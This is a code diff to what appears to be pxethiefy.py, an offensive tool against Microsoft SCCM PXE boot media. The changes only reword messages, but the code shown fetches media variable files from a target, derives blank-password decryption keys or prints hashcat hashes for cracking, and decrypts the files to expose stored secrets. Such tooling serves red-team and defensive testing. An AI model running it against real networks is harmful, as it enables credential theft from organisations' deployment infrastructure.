@@ -38,20 +38,22 @@ if data_variables is None:
     print("[!] TFTP download failed — file must be retrieved manually")
     print(f"[*] Download the variables file from: \\\\{args.target}\\REMINST{variables}")
     if cryptokey is not None:
+        print("[*] No PXE password set (crypto key found in DHCP response)")
         decrypt_password = sccm_client.derive_blank_decryption_key(cryptokey)
         if decrypt_password:
-            print(f"[*] Blank password detected — derived key: {decrypt_password.hex()}")
+            print(f"[*] Derived key: {decrypt_password.hex()}")
             print(f"[*] Decrypt with: python3 pxethiefy.py decrypt -p {decrypt_password.hex()} -f <variables_file>")
     else:
+        print("[*] PXE media is password-protected (no crypto key in DHCP response)")
         print("[*] Decrypt with: python3 pxethiefy.py decrypt -p PASSWORD -f <variables_file>")
     exit()
 
-if cryptokey == None:
-    # Password-protected case
+if cryptokey is None:
+    # Password IS set — no crypto key in DHCP response, need to crack the hash
+    print("[*] PXE media is password-protected (no crypto key in DHCP response)")
     hashcat_hash = f"$sccm$aes128${sccm_client.read_media_variable_file_header(data_variables).hex()}"
 
     if args.password:
-        # User supplied cracked password — decrypt
         print("[*] Decrypting media file with supplied password...")
         try:
             password_bytes = bytes.fromhex(args.password)
@@ -62,18 +64,18 @@ if cryptokey == None:
             print(f"[!] Decryption failed: {e}")
             print(f"[*] You can also download the file manually from: \\\\{args.target}\\REMINST{variables}")
     else:
+        print("[*] Hashcat hash:")
         print(hashcat_hash)
-        print("[*] Try cracking this hash to read the media file")
-        print("[*] Then re-run with: -p <cracked_password_hex>")
+        print("[*] Crack this hash, then re-run with: -p <cracked_password_hex>")
         print(f"[*] Or download the variables file from: \\\\{args.target}\\REMINST{variables}")
         print("[*] And decrypt with: python3 pxethiefy.py decrypt -p PASSWORD -f <variables_file>")
 else:
-    # Blank password case
-    print("[*] Blank password on PXE media file found!")
-    print("[*] Attempting to decrypt it...")
+    # No password set — crypto key IS in the DHCP response, can decrypt directly
+    print("[*] No PXE password set (crypto key found in DHCP response)")
+    print("[*] Deriving decryption key...")
     decrypt_password = sccm_client.derive_blank_decryption_key(cryptokey)
     if decrypt_password:
-        print("[*] Password retrieved: " + decrypt_password.hex())
+        print("[*] Derived key: " + decrypt_password.hex())
         try:
             decrypted = sccm_client.decrypt_media_file(data_variables, decrypt_password)
             print("[*] Decrypted media variables:")
